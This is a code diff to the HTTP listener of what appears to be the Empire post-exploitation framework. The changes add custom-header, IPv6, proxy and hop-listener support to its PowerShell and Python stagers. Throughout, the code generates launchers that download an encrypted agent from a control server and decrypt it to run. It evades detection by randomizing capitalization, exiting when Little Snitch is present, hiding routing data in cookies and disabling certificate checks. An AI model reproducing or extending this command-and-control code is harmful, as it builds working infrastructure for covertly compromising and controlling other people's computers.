@@ -6,7 +6,7 @@ import time
 import copy
 from pydispatch import dispatcher
 from flask import Flask, request, make_response
-
+import pdb
 # Empire imports
 from lib.common import helpers
 from lib.common import agents
@@ -97,7 +97,7 @@ class Listener:
                 'Value'         :   ''
             },
             'ServerVersion' : {
-                'Description'   :   'TServer header for the control server.',
+                'Description'   :   'Server header for the control server.',
                 'Required'      :   True,
                 'Value'         :   'Microsoft-IIS/7.5'
             }
@@ -158,6 +158,7 @@ class Listener:
             profile = listenerOptions['DefaultProfile']['Value']
             uris = [a for a in profile.split('|')[0].split(',')]
             stage0 = random.choice(uris)
+            customHeaders = profile.split('|')[2:]
 
             if language.startswith('po'):
                 # PowerShell
@@ -204,6 +205,16 @@ class Listener:
                             pass
 
                 # TODO: reimplement stager retries?
+                #check if we're using IPv6
+                listenerOptions = copy.deepcopy(listenerOptions)
+                bindIP = listenerOptions['BindIP']['Value']
+                port = listenerOptions['Port']['Value']
+                if ':' in bindIP:
+                    if "http" in host:
+                        if "https" in host:
+                            host = 'https://' + '[' + str(bindIP) + ']' + ":" + str(port)
+                        else:
+                            host = 'http://' + '[' + str(bindIP) + ']' + ":" + str(port) 
 
                 # code to turn the key string into a byte array
                 stager += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
@@ -216,7 +227,16 @@ class Listener:
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL', meta='STAGE0', additional='None', encData='')
                 b64RoutingPacket = base64.b64encode(routingPacket)
 
+                #Add custom headers if any
+                if customHeaders != []:
+                    for header in customHeaders:
+                        headerKey = header.split(':')[0]
+                        headerValue = header.split(':')[1]
+                        stager += helpers.randomize_capitalization("$wc.Headers.Add(")
+                        stager += "\"%s\",\"%s\");" % (headerKey, headerValue)
+
                 # add the RC4 packet to a cookie
+
                 stager += helpers.randomize_capitalization("$wc.Headers.Add(")
                 stager += "\"Cookie\",\"session=%s\");" % (b64RoutingPacket)
 
@@ -252,27 +272,43 @@ class Listener:
                         launcherBase += "if re.search(\"Little Snitch\", out):\n"
                         launcherBase += "   sys.exit()\n"
                 except Exception as e:
-                    p = "[!] Error setting LittleSnitch in stagger: " + str(e)
+                    p = "[!] Error setting LittleSnitch in stager: " + str(e)
                     print helpers.color(p, color='red')
 
                 if userAgent.lower() == 'default':
                     profile = listenerOptions['DefaultProfile']['Value']
                     userAgent = profile.split('|')[1]
 
-
-                launcherBase += "o=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['build_opener']).build_opener();"
+                launcherBase += "import urllib2;\n"
                 launcherBase += "UA='%s';" % (userAgent)
                 launcherBase += "server='%s';t='%s';" % (host, stage0)
 
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='PYTHON', meta='STAGE0', additional='None', encData='')
                 b64RoutingPacket = base64.b64encode(routingPacket)
-
+                
+                launcherBase += "req=urllib2.Request(server+t);\n"
                 # add the RC4 packet to a cookie
-                launcherBase += "o.addheaders=[('User-Agent',UA), (\"Cookie\", \"session=%s\")];" % (b64RoutingPacket)
+                launcherBase += "req.add_header('User-Agent',UA);\n"
+                launcherBase += "req.add_header('Cookie',\"session=%s\");\n" % (b64RoutingPacket)
+
+                # Add custom headers if any
+                if customHeaders != []:
+                    for header in customHeaders:
+                        headerKey = header.split(':')[0]
+                        headerValue = header.split(':')[1]
+                        #launcherBase += ",\"%s\":\"%s\"" % (headerKey, headerValue)
+                        launcherBase += "req.add_header(\"%s\",\"%s\");\n" % (headerKey, headerValue)
+
+                
+                launcherBase += "if urllib2.getproxies():\n"
+                launcherBase += "   o = urllib2.build_opener();\n"
+                launcherBase += "   o.add_handler(urllib2.ProxyHandler(urllib2.getproxies()))\n"
+                launcherBase += "   urllib2.install_opener(o);\n"
 
                 # download the stager and extract the IV
-                launcherBase += "a=o.open(server+t).read();"
+                
+                launcherBase += "a=urllib2.urlopen(req).read();\n"
                 launcherBase += "IV=a[0:4];"
                 launcherBase += "data=a[4:];"
                 launcherBase += "key=IV+'%s';" % (stagingKey)
@@ -317,6 +353,7 @@ class Listener:
         uris = [a.strip('/') for a in profile.split('|')[0].split(',')]
         stagingKey = listenerOptions['StagingKey']['Value']
         host = listenerOptions['Host']['Value']
+        customHeaders = profile.split('|')[2:]
 
         # select some random URIs for staging from the main profile
         stage1 = random.choice(uris)
@@ -332,6 +369,11 @@ class Listener:
             # make sure the server ends with "/"
             if not host.endswith("/"):
                 host += "/"
+
+            #Patch in custom Headers
+            if customHeaders != []:
+                headers = ','.join(customHeaders)
+                stager = stager.replace("$customHeaders = \"\";","$customHeaders = \""+headers+"\";")
 
             # patch the server and key information
             stager = stager.replace('REPLACE_SERVER', host)
@@ -564,7 +606,7 @@ class Listener:
                 updateServers = "server = '%s'\n"  % (listenerOptions['Host']['Value'])
 
                 if listenerOptions['Host']['Value'].startswith('https'):
-                    updateServers += "import ssl;if hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;"
+                    updateServers += "hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None"
 
                 sendMessage = """
 def send_message(packets=None):
@@ -655,6 +697,15 @@ def send_message(packets=None):
             return response
 
 
+        @app.after_request
+        def add_proxy_headers(response):
+            "Add HTTP headers to avoid proxy caching."
+            response.headers['Cache-Control'] = "no-cache, no-store, must-revalidate"
+            response.headers['Pragma'] = "no-cache"
+            response.headers['Expires'] = "0"
+            return response
+
+
         @app.route('/<path:request_uri>', methods=['GET'])
         def handle_get(request_uri):
             """
@@ -673,6 +724,7 @@ def send_message(packets=None):
                     # see if we can extract the 'routing packet' from the specified cookie location
                     # NOTE: this can be easily moved to a paramter, another cookie value, etc.
                     if 'session' in cookie:
+                        dispatcher.send("[*] GET cookie value from %s : %s" % (clientIP, cookie), sender='listeners/http')
                         cookieParts = cookie.split(';')
                         for part in cookieParts:
                             if part.startswith('session'):
@@ -731,21 +783,33 @@ def send_message(packets=None):
             stagingKey = listenerOptions['StagingKey']['Value']
             clientIP = request.remote_addr
 
+            requestData = request.get_data()
+            dispatcher.send("[*] POST request data length from %s : %s" % (clientIP, len(requestData)), sender='listeners/http')
+
             # the routing packet should be at the front of the binary request.data
             #   NOTE: this can also go into a cookie/etc.
-
-            dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, request.get_data(), listenerOptions, clientIP)
+            dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, requestData, listenerOptions, clientIP)
             if dataResults and len(dataResults) > 0:
                 for (language, results) in dataResults:
                     if results:
                         if results.startswith('STAGE2'):
                             # TODO: document the exact results structure returned
+                            if ':' in clientIP:
+                                clientIP = '[' + str(clientIP) + ']'
                             sessionID = results.split(' ')[1].strip()
                             sessionKey = self.mainMenu.agents.agents[sessionID]['sessionKey']
                             dispatcher.send("[*] Sending agent (stage 2) to %s at %s" % (sessionID, clientIP), sender='listeners/http')
 
+                            hopListenerName = request.headers.get('Hop-Name')
+                            try:
+                                hopListener = helpers.get_listener_options(hopListenerName)
+                                tempListenerOptions = copy.deepcopy(listenerOptions)
+                                tempListenerOptions['Host']['Value'] = hopListener['Host']['Value']
+                            except TypeError:
+                                tempListenerOptions = listenerOptions
+
                             # step 6 of negotiation -> server sends patched agent.ps1/agent.py
-                            agentCode = self.generate_agent(language=language, listenerOptions=listenerOptions)
+                            agentCode = self.generate_agent(language=language, listenerOptions=tempListenerOptions)
                             encryptedAgent = encryption.aes_encrypt_then_hmac(sessionKey, agentCode)
                             # TODO: wrap ^ in a routing packet?
 
